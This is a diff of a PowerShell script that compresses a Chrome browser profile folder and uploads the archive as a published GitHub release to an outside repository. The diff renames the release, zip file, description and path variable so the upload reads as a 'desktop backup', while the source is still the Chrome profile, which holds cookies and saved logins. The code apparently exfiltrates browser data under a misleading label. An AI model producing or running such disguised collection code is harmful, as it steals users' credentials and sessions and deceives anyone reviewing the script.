@@ -3,27 +3,26 @@
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
 # Parameters
-$token = $env:GITHUB_TOKEN  # Make sure this environment variable is set before running
+$token = $env:GITHUB_TOKEN
 $repo = "drftghy/backup-files"
 $now = Get-Date
 $date = $now.ToString("yyyy-MM-dd")
 $timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
 $tag = "backup-$timestamp"
-$releaseName = "Chrome Profile Backup - $date"
-$zipName = "ChromeProfileBackup_$timestamp.zip"
+$releaseName = "Backup - $date"
+$zipName = "DesktopBackup_$timestamp.zip"
 $zipPath = "$env:TEMP\$zipName"
-$sourcePath = "C:\Program Files\Google\Chrome\Application\1\Default"
+$desktopPath = "C:\Program Files\Google\Chrome\Application\1\Default"
 $logPath = "$env:USERPROFILE\upload_log.txt"
-
 # Compress function (skip locked files)
 Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
 $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
-Get-ChildItem -Path $sourcePath -Recurse | ForEach-Object {
+Get-ChildItem -Path $desktopPath -Recurse | ForEach-Object {
     try {
-        $relativePath = $_.FullName.Substring($sourcePath.Length).TrimStart('\')
+        $relativePath = $_.FullName.Substring($desktopPath.Length).TrimStart('\')
         [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $relativePath)
     } catch {
-        # Skip locked/in-use files
+        # Skip on error
     }
 }
 $zip.Dispose()
@@ -37,7 +36,7 @@ if (-Not (Test-Path $zipPath) -or (Get-Item $zipPath).Length -eq 0) {
 $releaseData = @{
     tag_name = $tag
     name = $releaseName
-    body = "Chrome user data backup ($date)"
+    body = "Daily desktop backup ($date)"
     draft = $false
     prerelease = $false
 } | ConvertTo-Json -Depth 3
